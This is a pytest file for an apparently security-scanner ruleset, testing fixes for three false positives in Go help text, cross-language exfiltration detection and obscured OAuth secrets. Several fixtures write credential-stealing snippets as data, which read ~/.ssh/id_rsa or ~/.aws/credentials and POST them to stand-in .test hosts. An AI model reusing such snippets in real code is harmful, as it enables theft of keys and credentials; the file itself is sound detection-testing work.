"""Ruleset 77: three false positives found on a well-known Go command-line tool (2026-10-16).

A - ``ST-SENS-PATH`` matched credential paths inside the help text of a Go option: a multi-line
raw string (`` Help: `...` ``) that tells a person where the credentials file lives, or quotes the
shell command they should type (``awk ... < ~/.ssh/id_rsa``). A multi-line raw string held by a
help/usage field and made of prose is now judged as help text. A raw string passed to a call, a
one-line raw string, and a short help literal stay in scope.

B - ``ST-COMBO-EXFIL`` joined a credential reference in Go server code with network egress that
existed only in a Python developer script. The two halves must now be able to belong to one
program: same language runtime, or one side in glue (shell, markdown, config) that starts the other.

C - ``ST-SECRET-EMBEDDED`` reported OAuth client secrets that a distributed desktop/CLI app ships
in obscured form beside its public client id (RFC 8252, section 8.5: not confidential). Those go to
needs_review; keys, tokens, passwords, plain client secrets and provider-prefixed keys stay scored.

Sanitized fixtures only: hosts are ``.test``, values are synthetic, nothing is executed.
"""

from __future__ import annotations

from pathlib import Path

from skilltotal.engine import analyze_directory
from skilltotal.file_index import _c_code_spans
from skilltotal.models import Component


def _report(root: Path):
    return analyze_directory(root, Component(name="x", type="directory", source=str(root)))


def _ids(root: Path) -> set[str]:
    return {f.id for f in _report(root).findings}


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


# --- A: Go help text --------------------------------------------------------------------------

_GO_HELP = '''package backend

var Options = []Option{{
	Name: "shared_credentials_file",
	Help: `Path to the shared credentials file.

If this variable is empty the tool will look for the
"SHARED_CREDENTIALS_FILE" env variable. If the env value is empty
it will default to the current user's home directory.

    Linux/OSX: "$HOME/.aws/credentials"
`,
}, {
	Name: "key_pem",
	Help: `Raw PEM-encoded private key.

This will generate the single line correctly:

    awk '{printf "%s\\\\n", $0}' < ~/.ssh/id_rsa

If specified, it will override the key_file parameter.`,
}}
'''


def test_go_help_raw_string_is_not_a_credential_read(tmp_path: Path) -> None:
    root = _write(tmp_path, {"options.go": _GO_HELP})
    assert "ST-SENS-PATH" not in _ids(root)


def test_go_command_long_help_is_not_a_credential_read(tmp_path: Path) -> None:
    root = _write(tmp_path, {"cmd.go": (
        "package cmd\n\nvar serveCmd = &cobra.Command{\n\tUse: \"serve\",\n"
        "\tLong: `Serve files over SFTP. If no host key is given, the server uses the key of the "
        "user who runs it, and creates one when it is missing.\n\n"
        "    Default: ~/.ssh/id_rsa\n`,\n}\n"
    )})
    assert "ST-SENS-PATH" not in _ids(root)


def test_go_raw_string_script_passed_to_a_call_stays_flagged(tmp_path: Path) -> None:
    root = _write(tmp_path, {"collect.go": (
        "package main\n\nimport \"os/exec\"\n\nfunc main() {\n"
        "\t_ = exec.Command(\"sh\", \"-c\", `\n"
        "# Stage the key for the backup job that runs after this step, as described in the docs.\n"
        "cp ~/.ssh/id_rsa /tmp/.cache-k\n`).Run()\n}\n"
    )})
    assert "ST-SENS-PATH" in _ids(root)


def test_go_one_line_raw_string_path_stays_flagged(tmp_path: Path) -> None:
    root = _write(tmp_path, {"read.go": (
        "package main\n\nimport \"os\"\n\nfunc main() {\n"
        "\tb, _ := os.ReadFile(`/home/u/.ssh/id_rsa`)\n\t_ = b\n}\n"
    )})
    assert "ST-SENS-PATH" in _ids(root)


def test_go_short_help_literal_holding_a_command_stays_flagged(tmp_path: Path) -> None:
    root = _write(tmp_path, {"opt.go": (
        "package main\n\nvar o = Option{\n\tHelp: `\ncat ~/.ssh/id_rsa\n`,\n}\n"
    )})
    assert "ST-SENS-PATH" in _ids(root)


def test_go_raw_string_has_no_escapes() -> None:
    text = "var root = `C:\\`\n// copy ~/.ssh/id_rsa\nvar x = 1\n"
    comments, strings, _ = _c_code_spans(text, ".go")
    assert strings == [(text.index("`"), text.index("`", text.index("`") + 1) + 1)]
    assert any(s <= text.index("~/.ssh") < e for s, e in comments)


def test_go_raw_string_ending_in_backslash_keeps_later_comment_a_comment(tmp_path: Path) -> None:
    root = _write(tmp_path, {"paths.go": (
        "package main\n\nvar root = `C:\\`\n\n// ~/.ssh/id_rsa\n"
        "var x = 1\n"
    )})
    assert "ST-SENS-PATH" not in _ids(root)


# --- B: one program, one flow -----------------------------------------------------------------

_PY_NET = (
    "import requests\n\n\ndef rpc(command, params):\n"
    "    return requests.post('https://api.example.test/' + command, json=params).json()\n"
)
_GO_KEY = (
    "package serve\n\nimport \"path/filepath\"\n\n"
    "func keyPath(dir string) string {\n\treturn filepath.Join(dir, \"id_rsa\")\n}\n"
)


def test_combo_does_not_join_go_credential_ref_with_python_egress(tmp_path: Path) -> None:
    root = _write(tmp_path, {"server.go": _GO_KEY, "bin/rc.py": _PY_NET})
    ids = _ids(root)
    assert "ST-SENS-PATH" in ids and "ST-NET-PY" in ids
    assert "ST-COMBO-EXFIL" not in ids


def test_combo_does_not_join_python_read_with_node_egress(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "collect.py": "import os\n\nprint(open(os.path.expanduser('~/.aws/credentials')).read())\n",
        "web/app.js": "fetch('https://api.example.test/ping', { method: 'POST', body: 'x' });\n",
    })
    assert "ST-COMBO-EXFIL" not in _ids(root)


def test_combo_still_joins_shell_stage_with_node_send(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "stage.sh": "#!/bin/sh\ncp ~/.ssh/id_rsa /tmp/.k\nnode send.js\n",
        "send.js": (
            "const fs = require('fs');\n"
            "fetch('https://collect.example.test/k', { method: 'POST', "
            "body: fs.readFileSync('/tmp/.k', 'utf8') });\n"
        ),
    })
    assert "ST-COMBO-EXFIL" in _ids(root)


def test_combo_still_joins_typescript_read_with_javascript_send(tmp_path: Path) -> None:
    root = _write(tmp_path, {
        "src/read.ts": (
            "import * as fs from 'fs';\n"
            "export const key = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, 'utf8');\n"
        ),
        "src/send.js": (
            "const { key } = require('./read');\n"
            "fetch('https://collect.example.test/k', { method: 'POST', body: key });\n"
        ),
    })
    assert "ST-COMBO-EXFIL" in _ids(root)


def test_combo_still_fires_in_one_python_file(tmp_path: Path) -> None:
    root = _write(tmp_path, {"steal.py": (
        "import os\nimport requests\n\n"
        "data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
        "requests.post('https://collect.example.test/c', data=data)\n"
    )})
    assert "ST-COMBO-EXFIL" in _ids(root)


# --- C: obscured OAuth client secret of a distributed app -------------------------------------

_SECRET = "Qm9rT2xLp7Vw3ZsXy8NdHa4Jc6Ef"


def _go_consts(name: str, with_client_id: bool = True) -> str:
    cid = '\tappClientID = "202264815644.apps.example.test"\n' if with_client_id else ""
    return f'package drive\n\nconst (\n{cid}\t{name} = "{_SECRET}"\n)\n'


def test_obscured_client_secret_next_to_client_id_is_review_only(tmp_path: Path) -> None:
    root = _write(tmp_path, {"drive.go": _go_consts("appEncryptedClientSecret")})
    report = _report(root)
    assert "ST-SECRET-EMBEDDED" not in {f.id for f in report.findings}
    assert any("Obscured OAuth client secret" in n.title for n in report.needs_review)


def test_obscured_client_secret_other_spellings(tmp_path: Path) -> None:
    for i, name in enumerate(
        ("appObscuredClientSecret", "legacy_encrypted_client_secret", "OBFUSCATED_CLIENT_SECRET")
    ):
        root = _write(tmp_path / str(i), {"a.go": _go_consts(name)})
        assert "ST-SECRET-EMBEDDED" not in _ids(root), name


def test_obscured_client_secret_without_client_id_stays_flagged(tmp_path: Path) -> None:
    root = _write(tmp_path, {"drive.go": _go_consts("appEncryptedClientSecret", False)})
    assert "ST-SECRET-EMBEDDED" in _ids(root)


def test_plain_client_secret_stays_flagged(tmp_path: Path) -> None:
    root = _write(tmp_path, {"drive.go": _go_consts("appClientSecret")})
    assert "ST-SECRET-EMBEDDED" in _ids(root)


def test_obscured_key_or_token_stays_flagged(tmp_path: Path) -> None:
    for i, name in enumerate(("encryptedApiKey", "obscuredToken", "encryptedPassword")):
        root = _write(tmp_path / str(i), {"a.go": _go_consts(name)})
        assert "ST-SECRET-EMBEDDED" in _ids(root), name


def test_provider_prefixed_token_under_obscured_name_stays_flagged(tmp_path: Path) -> None:
    token = "ghp_" + "R8tY2uI9oP3aS5dF7gH1jK4lZ6xC0vB2nM8qWe"
    root = _write(tmp_path, {"a.go": (
        'package a\n\nconst (\n\tappClientID = "4131"\n'
        f'\tappEncryptedClientSecret = "{token}"\n)\n'
    )})
    assert "ST-SECRET-EMBEDDED" in _ids(root)
